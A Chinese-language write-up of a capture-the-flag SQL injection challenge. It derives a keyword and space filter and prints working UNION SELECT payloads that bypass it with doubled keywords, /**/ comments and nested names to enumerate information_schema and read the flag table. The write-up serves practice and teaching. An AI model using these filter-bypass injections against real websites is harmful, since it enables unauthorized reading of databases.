

# 简单sql注入

## 题目

> [http://ctf5.shiyanbar.com/423/web/](http://ctf5.shiyanbar.com/423/web/) 
>
> flag
>
> 到底过滤了什么东西？

## 流程图

## 解题步骤

#### 参考文章

##### 0x1 直接猜测表名和字段名

> 解题思路：研究了好久，看了writeup才知道
>
> 1）在文本框输入1，提交，链接变成id=1
>
> 2）在文件框输入1‘，提交，报错，判断存在注入。
>
> 3）初步预计后台表为flag,字段名为flag,需要构造union select flag from flag来执行。
>
> 4）根据第二步的报错信息看，多加个‘，后面的语句需要再构造一个条件来结束’，注入语句为：1‘ union select flag from flag where 't'='t
>
> 执行后报错：heck the manual that corresponds to your MySQL server version for the right syntax to use near 'flag flag 't'='t'' at line 1
>
> 分析：根据错误信息发现只有变量了，其他的关键字都被过滤了。
>
> 5）把关键字写2遍提交，发现如下报错： corresponds to your MySQL server version for the right syntax to use near 'unionselectflag fromflag where't'='t'' at line 1
>
>   分析：发现空格被过滤了
>
> 6)）使用+号在空格之前连接：
>
> <http://ctf5.shiyanbar.com/423/web/?id=1> '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t
>
> 得到KEY:flag{xxxxxx}

##### 0x2 正常流程读取

> http://www.shiyanbar.com/ctf/writeup/4750

#### 步骤

##### 0x1 直接猜测法

1. 在文本框输入1，提交，链接变成id=1

2. 在文件框输入1‘，提交，报错，判断存在注入

3. 在文本框输入`test`，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入

4. 参考上面的文章1

5. 在文章1的第五步当中，发现空格被过滤是对的，但是并不是因为编码的原因，即使将空格替换为+号，但是没有重复，依然会被过滤掉，经过测试，发现如下语句可以正常执行

   ```mysql
   http://ctf5.shiyanbar.com/423/web/?id=1'unionunion  selectselect  flag fromfrom  flag wherewhere 't'='t
   ```

   所有被过滤的关键词（除了where）后面都必须跟两个空格，非关键词后面的空格不会被过滤掉，**至于where后面为什么只需要一个空格，可能和分组的机制有关系，仍需分析**

   不论空格被替换为+号还是/\*\*/，但是不能重复出现两个/\*\*/，虽然在mysql中可以正常执行，但是由于后台过滤只会把+号解析为空格，然后对每个以空格分割后的分组应用进行从后往前的关键词过滤，并且只进行一次

6. 基于上诉的分析，所以，可以不采用重复关键词的方法，只使用/**/替代掉空格，就会使得从后向前的过滤机制失效，从而可以不使用重复关键词的方法

##### 0x2 标准流程法

1. 基于上述过滤要点分析，先查询数据库名

   ```myslq
   1' union/**/select/**/database()'
   ```

   得到结果`web1`

2. 猜测表名

   ```mysql
   1' union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schema/**/='web1
   ```

   这里报了错：

   > ### `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '='web'' at line 1`

   可以得知，`table_schema`被作为关键词过滤了，但是过滤的方式却不同，即使使用双重关键词的方式依旧不行，尝试使用双重查询语句（nonrecursivereplacement有类似的功能），发现可以绕过

   ```mysql
   http://ctf5.shiyanbar.com/423/web/?id=1' union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schemtable_schemaa/**/='web1
   ```

   得到表名: `flag`和`web_1`

3. 猜测字段名

   同样需要对`information_schema.columns`进行双重查询

   ```mysql
   http://ctf5.shiyanbar.com/423/web/?id=1' union/**/select/**/column_namcolumn_namee/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/table_name='flag
   ```

   得到字段名`flag`和`id`

4. 查询表数据

   ```mysql
   1'union/**/select/**/flag from/**/flag where/**/'1'='1
   ```

   得到flag：`flag{Y0u_@r3_5O_dAmn_90Od}`

## 解答思路

1. 判断是否存在注入点
2. 判断注入类型
3. 判断后台的过滤机制
   - 关键字被过滤
     - 重复关键词（例如selectselect），测试结果
   - 空格被过滤
     - 使用双重空格（使用+号替代也需要重复两次）
   - ~~该后台过滤的机制是将所有敏感字符只过滤第一次遇到的，所以将过滤关键词全部重复一次即可~~
   - 在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式
4. 几个有关sql语法的点
   - union 关键词如果跟在字符串后面，不需要空格也能正常执行
   - `select database()`之后直接加上`''`可以正常执行，但 `select database() from ctf`之后加上`''`会导致语法错误，所以，需要使用where子句来闭合


## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5` 
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

